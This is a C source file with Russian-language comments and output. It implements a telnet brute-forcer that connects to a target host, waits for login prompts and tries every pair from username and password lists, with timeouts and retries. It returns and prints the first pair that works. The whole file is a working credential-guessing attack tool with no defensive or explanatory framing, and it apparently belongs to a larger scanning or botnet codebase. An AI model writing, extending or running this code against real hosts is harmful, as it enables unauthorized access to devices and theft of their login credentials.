#include "include/includes.h"
#include "bruteforce_functions/wait_for_prompt.c"
#include "bruteforce_functions/socket_things.c"
#include "bruteforce_functions/login_things.c"

Credentials telnet_login(const char *host) {
    static Credentials result;
    char buffer[TELNET_MAX_BUFFER];
    int sock;
    struct sockaddr_in server;
    int retry_count = 0;
    const int max_retries = 3;

    printf("Пытаемся войти на %s...\n", host);

    // Инициализация результата
    memset(&result, 0, sizeof(Credentials));

    for (const char **username = usernames; *username != NULL; username++) {
        for (const char **password = passwords; *password != NULL; password++) {
            retry_count = 0;
            while (retry_count < max_retries) {
                sock = create_socket(host, &server);
                if (sock < 0) {
                    printf("Не удалось установить соединение\n");
                    sleep(1);
                    retry_count++;
                    continue;
                }

                // Установка таймаута для сокета
                struct timeval timeout;
                timeout.tv_sec = 5;  // 5 секунд таймаут
                timeout.tv_usec = 0;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

                if (!wait_for_prompt(sock)) {
                    close(sock);
                    retry_count++;
                    sleep(1);
                    continue;
                }

                send_username(sock, *username);
                
                if (!wait_for_prompt(sock)) {
                    close(sock);
                    retry_count++;
                    sleep(1);
                    continue;
                }

                send_password(sock, *password);

                if (check_login_success(sock, buffer)) {
                    strncpy(result.username, *username, sizeof(result.username) - 1);
                    strncpy(result.password, *password, sizeof(result.password) - 1);
                    result.good = 1;
                    close(sock);
                    return result;
                }

                close(sock);
                break;  // Выход из цикла retry если логин неуспешен
            }
            sleep(1);  // Задержка между попытками
        }
    }

    return result;
}

Credentials telnet_brute(char *host) {
    Credentials credentials = telnet_login(host);
    
    if (credentials.username[0] != '\0' && credentials.password[0] != '\0') {
        printf("Успешный вход: %s:%s\n", credentials.username, credentials.password);
    } else {
        printf("Не удалось войти на %s\n", host);
    }

    return credentials;
}